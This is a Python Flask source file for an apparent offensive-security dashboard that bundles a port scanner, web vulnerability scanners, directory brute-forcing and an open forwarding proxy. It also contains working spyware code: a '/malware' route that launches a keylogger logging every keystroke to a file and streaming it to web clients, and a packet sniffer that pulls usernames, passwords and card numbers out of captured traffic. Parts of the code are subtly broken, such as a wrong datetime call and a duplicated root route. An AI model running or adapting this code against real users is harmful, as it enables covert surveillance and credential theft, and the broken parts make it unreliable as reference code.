from flask import Flask, render_template, jsonify, request, Response,redirect,url_for,g
from scapy.all import sniff, IP, TCP, UDP, Raw, DNS
import socket
import time
from network_scanner import main
import datetime
import re
from bs4 import BeautifulSoup
import requests
from sqlinjection import scan_sql_injection
from urllib.parse import unquote    
from apiendpoint import analyze_endpoints
from openredirect import is_open_redirect
from crosssitescriptting import crosssitescripting_result
from securityheaders import check_http_security_headers
from securitymisconfig import check_security_misconfiguration
from tls import check_tls_security
import time 
import requests
import threading
from collections import deque
import pynput
import pynput.keyboard
from urllib.parse import urljoin


app = Flask(__name__)

ALLOWED_INTERFACES = ['Wi-Fi', 'Ethernet', 'WiFi']
selected_interface = None
captured_packets = []
capture_active = False

# Credentials patterns to detect
credential_keywords = {
    "username": re.compile(r"(?i)username|user|login"),
    "password": re.compile(r"(?i)password|pass|pwd"),
    "credit_card": re.compile(r"\b\d{4}[\s-]?\d{4}[\s-]?\d{4}[\s-]?\d{4}\b")
}

def write_to_file(captured_packets):
    with open("captured_traffic.txt", "w") as file:
        for packet in captured_packets:
            file.write(f"Packet Number: {packet['Packet Number']}\n")
            file.write(f"Time: {packet['Time']}\n")
            file.write(f"Length: {packet['Length']}\n")
            file.write(f"Info: {packet['Info']}\n")
            file.write(f"Source IP: {packet['Source IP']}\n")
            file.write(f"Destination IP: {packet['Destination IP']}\n")
            file.write(f"Source Port: {packet['Source Port']}\n")
            file.write(f"Destination Port: {packet['Destination Port']}\n")
            file.write(f"Protocol: {packet['Protocol']}\n")
            file.write(f"Data: {packet['Data']}\n")
            file.write("==================================================================================\n")

        # Collect packets with detected credentials and their detailed information
        packets_with_credentials = [packet for packet in captured_packets if 'Detected Credentials' in packet and packet['Data']]
        if packets_with_credentials:
            file.write("\n\n\n==================================================================================\n")
            file.write("                              Detected Credentials:\n")
            file.write("==================================================================================\n")
            for packet in packets_with_credentials:
                file.write(f"Packet Number: {packet['Packet Number']}\n")
                file.write(f"Time: {packet['Time']}\n")
                file.write(f"Length: {packet['Length']}\n")
                file.write(f"Info: {packet['Info']}\n")
                file.write(f"Source IP: {packet['Source IP']}\n")
                file.write(f"Destination IP: {packet['Destination IP']}\n")
                file.write(f"Source Port: {packet['Source Port']}\n")
                file.write(f"Destination Port: {packet['Destination Port']}\n")
                file.write(f"Protocol: {packet['Protocol']}\n")
                file.write(f"Raw Data: {packet['Data']}\n")
                file.write("==============================================================================\n")

def check_for_credentials(payload):
    credentials_found = {}
    for key, pattern in credential_keywords.items():
        matches = pattern.finditer(payload)
        found_values = []
        for match in matches:
            found_values.append(match.group())
        if found_values:
            credentials_found[key] = found_values
    return credentials_found

def packet_callback(packet):
    if capture_active:
        packet_time = packet.time
        packet_time_formatted = datetime.fromtimestamp(packet_time).strftime('%Y-%m-%d %H:%M:%S')

        packet_count = len(captured_packets) + 1

        packet_length = len(packet)

        packet_details = {
            "Packet Number": packet_count,
            "Time": packet_time_formatted,
            "Length": packet_length,
            "Info": packet.summary(),
            "Source IP": None,
            "Destination IP": None,
            "Source Port": None,
            "Destination Port": None,
            "Protocol": "Unknown",
            "Data": ""
        }

        if IP in packet:
            packet_details["Source IP"] = packet[IP].src
            packet_details["Destination IP"] = packet[IP].dst

            if TCP in packet:
                packet_details["Protocol"] = "TCP"
                packet_details["Source Port"] = packet[TCP].sport
                packet_details["Destination Port"] = packet[TCP].dport

                if packet[TCP].dport in [80, 443]:
                    if Raw in packet:
                        load = packet.getlayer(Raw).load.decode(errors='ignore')
                        if load.startswith('GET') or load.startswith('POST'):
                            host = re.search(r"(?i)host:\s(.*?)\r\n", load)
                            packet_details["Data"] = load
                            packet_details["HTTP Request to"] = host.group(1)
                            
            elif UDP in packet:
                packet_details["Protocol"] = "UDP"
                packet_details["Source Port"] = packet[UDP].sport
                packet_details["Destination Port"] = packet[UDP].dport

                if packet[UDP].dport == 53:
                    if DNS in packet:
                        packet_details["Data"] = packet.getlayer(DNS).qd.qname.decode()

            # Check for credential keywords in the packet payload
            if Raw in packet:
                load = packet.getlayer(Raw).load.decode(errors='ignore')
                credentials = check_for_credentials(load)
                if credentials:
                    packet_details["Detected Credentials"] = credentials

        captured_packets.append(packet_details)

@app.route('/')
def home():
    return render_template('index.html')

@app.route("/network_scanner", methods=['GET', 'POST'])
def network_scanner():
    if request.method == 'GET':
        return render_template('network_scanner.html')
    if request.method == 'POST':
        host = request.form.get("domaininput")
        try:
            start_time = time.time()
            if host == 'localhost' or host == '127.0.0.1':
                return render_template('network_scanner.html', invalid_domain="Invalid Domain")
            host_ip = socket.gethostbyname(host)
            port = main(host_ip)
            total_time = time.time() - start_time
        except:
            return render_template("network_scanner.html", invalid_domain="Invalid Domain")
        return render_template("network_scanner.html", port=port, port_len=len(port), total_time=total_time, host_ip=host_ip, host_name=host)

@app.route('/packet_sniffer', methods=['GET', 'POST'])
def packet_sniffer():
    if request.method == 'POST':
        interface = request.form.get('interface')
        action = request.form.get('action')
        if action == 'start':
            return jsonify(start_capture(interface))
        elif action == 'stop':
            return jsonify(stop_capture())
        elif action == 'clear':
            return jsonify(clear_packets())
    return render_template('packet_sniffer.html')

@app.route('/select_interface/<interface>')
def select_interface(interface):
    global selected_interface
    if interface in ALLOWED_INTERFACES:
        selected_interface = interface
        return jsonify({"success": True, "message": f"Interface selected: {interface}"})
    else:
        return jsonify({"success": False, "message": "Invalid interface"})
    
@app.route('/start_capture')
def start_capture():
    global capture_active, selected_interface
    capture_active = True
    if selected_interface:
        sniff(iface=selected_interface, prn=packet_callback, count=5000)
        return jsonify({"success": True, "message": f"Capture started on {selected_interface}."})
    else:
        return jsonify({"success": False, "message": "No interface selected"})
    
@app.route('/stop_capture')
def stop_capture():
    global capture_active
    capture_active = False
    write_to_file(captured_packets)
    return jsonify({"success": True, "message": "Capture stopped. Captured packets saved to captured_traffic.txt."})

@app.route('/clear_packets')
def clear_packets():
    global captured_packets
    captured_packets = []
    return jsonify({"success": True, "message": "Captured packets cleared."})
    
@app.route('/captured_packets')
def get_captured_packets():
    return jsonify(captured_packets)

@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')
def proxy(path):
    # Extract the target URL from the request
    target_url = request.url.replace(request.host_url, '')
    
    # Forward the request to the target URL
    response = requests.request(
        method=request.method,
        url=target_url,
        headers={key: value for (key, value) in request.headers if key != 'Host'},
        data=request.get_data(),
        cookies=request.cookies,
        allow_redirects=False)
    
    # Log the request and response
    print(f"Request: {request.method} {request.url}")
    print(f"Response: {response.status_code} {response.url}")
    
    # Return the response from the target URL
    excluded_headers = ['content-encoding', 'content-length', 'transfer-encoding', 'connection']
    headers = [(name, value) for (name, value) in response.raw.headers.items() if name.lower() not in excluded_headers]
    
    return Response(response.content, response.status_code, headers)

@app.route('/file_interceptor')
def file_interceptor():
    return render_template('file_interceptor.html')


@app.route('/redirect_url_scanner', methods=['GET', 'POST'])
def redirect_url_scanner():
    if request.method == 'POST':
        url = request.form['hostname']
        redirect_links = []
        try:
            response = requests.get(url)
            soup = BeautifulSoup(response.content, 'html.parser')
            for link in soup.find_all('a'):
                href = link.get('href')
                if href and 'http' in href:
                    redirect_links.append(href)

            # Remove duplicate links
            redirect_links = list(set(redirect_links))
            return render_template('redirect_url_scanner.html', is_fetched=True, redirect_links=redirect_links)

        except requests.exceptions.RequestException:
            return 'Error occurred while scanning the URL.'
    else:
        return render_template('redirect_url_scanner.html', is_fetched=False)


from flask_socketio import SocketIO
from pynput import keyboard
import logging   
socketio = SocketIO(app)
file_log = "log.txt"
logging.basicConfig(filename=file_log, level=logging.DEBUG, format='%(message)s')
def on_press(key):
    try:
        key_char = key.char
    except AttributeError:
        key_char = str(key)
    
    # Log the keystroke to the file
    logging.info(key_char)
    
    # Emit the keystroke to the web client
    socketio.emit('keystroke', {'key': key_char})

def start_listener():
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

@app.route('/malware')
def malware():
    import threading
    listener_thread = threading.Thread(target=start_listener)
    listener_thread.start()
    return render_template('malware.html')        

def check_directory(url):
    try:
        get_response = requests.get(url)
        return get_response
    except requests.exceptions.ConnectionError:
        pass

def extract_urls(url):
    response = requests.get(url)
    return re.findall('(?:href=")(.*?)"', str(response.content))

def crawl(url):
    target_links = []
    href_links = extract_urls(url)
    for link in href_links:
        full_link = urljoin(url, link)
        if "#" in full_link:
            full_link = full_link.split("#")[0]
        if url in full_link and full_link not in target_links:
            target_links.append(full_link)
    return target_links

@app.route('/web_application_hacking', methods=['GET', 'POST'])
def web_application_hacking():
    if request.method == 'POST':
        if 'check_directory' in request.form:
            url = request.form['url']
            with open("dirs.txt", "r") as words:
                results = []
                for line in words:
                    word = line.strip()
                    link = url + "/" + word
                    response = check_directory(link)
                    if response is not None:
                        results.append("The directory exists --> " + link)
                return render_template('web_application_hacking.html', results=results)
        elif 'crawl_links' in request.form:
            target_url = request.form['target_url']
            links = crawl(target_url)
            return render_template('web_application_hacking.html', links=links)
    return render_template('web_application_hacking.html')

@app.route('/vulnerability_scanner')
def vulnerability_scanner():
    return render_template('vulnerability_scanner.html')

@app.route('/getinputsql', methods=['POST'])
def getinput():
    if request.method == 'POST':
        user_input = request.form.get('url')
        if user_input:
            user_input = unquote(user_input.replace('%22', ''))
            resultforms = scan_sql_injection(user_input)
            return render_template('vulnerability_scanner.html', result1=resultforms) 
        else:
            return "NO INPUT RECEIVED", 404
        
@app.route('/apiendipoint')
def apiendipoint():
    return render_template('apiendpoint.html')

@app.route('/getinputapi', methods=['POST'])
def getinputapi():
    if request.method == 'POST':
        user_input = request.form.get('url')
        if user_input:
            user_input = unquote(user_input.replace('%22', ''))
            apiresult = analyze_endpoints(user_input)
            return render_template('apiendpoint.html', resultapi=apiresult)
        else:
            return "No Input Provides.", 404
        
@app.route('/openredirect')
def openredirect():
    return render_template('openredirect.html')

@app.route('/getinputopenredirect', methods=['POST'])
def getinputopenredirect():
    if request.method == 'POST':
        user_input = request.form.get('url')
        if user_input:
            openredirectresult = is_open_redirect(user_input)
            return render_template('openredirect.html', resultopenredirect=openredirectresult)
        else:
            return "No Input Provides.", 404

@app.route('/crosssitescripting')
def crosssitescripting():
    return render_template('crosssitescriptting.html')

@app.route('/getinputcrosssitescriptting', methods=['POST'])
def getinputcrosssitescriptting():
    if request.method == 'POST':
        user_input = request.form.get('url')
        if user_input:
            crosssites_result = crosssitescripting_result(user_input)
            return render_template('crosssitescriptting.html', result_crosssite=crosssites_result)
        else:
            return "No Input Provides.", 404


@app.route('/securityheaders')
def securityheaders():
 return render_template('securityheaders.html')

@app.route('/getinput_SecurityHeaders', methods = ['POST'])
def getinput_SecurityHeaders():
     if request.method == 'POST':
        user_input = request.form.get('url')
        if user_input:
            headers_results = check_http_security_headers(user_input)
            return render_template('securityheaders.html', result_headers = headers_results)
        else:
            return "No Input Provides.", 404

@app.route('/securitymisconfig')
def securitymisconfig():
    return render_template('securitymisconfig.html')

@app.route('/securitymisconfiginput', methods = ['POST'])
def securitymisconfiginput():
    if request.method == 'POST':
     user_input = request.form.get('url')
     if(user_input):
         securitymisconfig_result = check_security_misconfiguration(user_input)
         return render_template('securitymisconfig.html', result_securitymisconfig=securitymisconfig_result)
     else:
         return ' No Input Found', 404
     
    
@app.route('/tls')
def tls():
  return render_template('tls.html')

@app.route('/tlsinput',  methods = ['POST'])
def tlsinput():
    if request.method == 'POST':
        user_input = request.form.get('url')
        if user_input:
            tls_result = check_tls_security(user_input)
            return render_template('tls.html', result_tls = tls_result )
    else:
         return ' No Input Found', 404

if __name__ == '__main__':
    app.run(debug=True)
